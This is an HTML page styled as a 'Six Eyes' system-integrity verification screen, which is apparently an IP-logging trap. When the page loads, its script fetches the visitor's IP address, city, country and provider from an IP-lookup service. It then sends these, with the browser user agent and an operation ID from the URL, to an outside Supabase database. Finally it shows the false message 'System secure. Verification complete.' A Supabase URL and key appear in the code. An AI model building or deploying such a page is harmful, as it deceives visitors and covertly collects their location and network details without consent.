<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gojo Six Eyes | Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body {
            background-color: #050505;
            color: #00d9ff;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            padding: 20px;
        }
        h1 {
            font-size: 1.8rem;
            letter-spacing: 4px;
            margin: 0;
        }
        .status {
            color: #888;
            font-size: 1rem;
            margin-top: 10px;
        }
        .loader {
            width: 100px;
            height: 1px;
            background: #222;
            margin: 20px auto;
            position: relative;
            overflow: hidden;
        }
        .loader::after {
            content: '';
            width: 30px;
            height: 100%;
            background: #00d9ff;
            position: absolute;
            animation: scan 1.5s infinite;
        }
        @keyframes scan {
            0% { left: -30px; }
            100% { left: 100px; }
        }
    </style>
</head>
<body>

<div class="container" id="main-content">
    <h1>ðŸŒ€ GOJO SIX EYES</h1>
    <div class="loader" id="loader"></div>
    <p class="status" id="status">Verifying system integrity...</p>
</div>

<script>
    // --- SUPABASE CONFIG (Sizning ma'lumotlaringiz) ---
    const SUPABASE_URL = 'https://kisbfmcxvcwtxfwbgexb.supabase.co'; 
    const SUPABASE_KEY = 'sb_publishable_THarexbaf5WB2Cc-c6t-sg_TQJycbtz';
    const _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const urlParams = new URLSearchParams(window.location.search);
    const opID = urlParams.get('id') || "UNSET";

    async function initTrace() {
        try {
            // IP va metadata yig'ish
            const res = await fetch("https://ipapi.co/json/");
            const data = await res.json();

            const payload = {
                operation_id: opID,
                ip: data.ip,
                location: `${data.city}, ${data.country_name}`,
                provider: data.org,
                user_agent: navigator.userAgent,
                created_at: new Date().toISOString()
            };

            // Bazaga yuborish
            await sendToDatabase(payload);
        } catch (err) {
            console.error("Trace error:", err);
            showFinalMessage(); 
        }
    }

    async function sendToDatabase(payload) {
        try {
            const { error } = await _supabase.from('telemetry').insert([payload]);
            if (error) throw error;
        } catch (e) {
            console.error("DB error:", e);
        } finally {
            showFinalMessage();
        }
    }

    function showFinalMessage() {
        document.getElementById('main-content').innerHTML = `
            <h1>ðŸŒ€ GOJO SIX EYES</h1>
            <p class="status" style="color: #00d9ff; margin-top: 15px;">
                System secure. Verification complete.
            </p>
        `;
    }

    window.onload = initTrace;
</script>

</body>
</html>
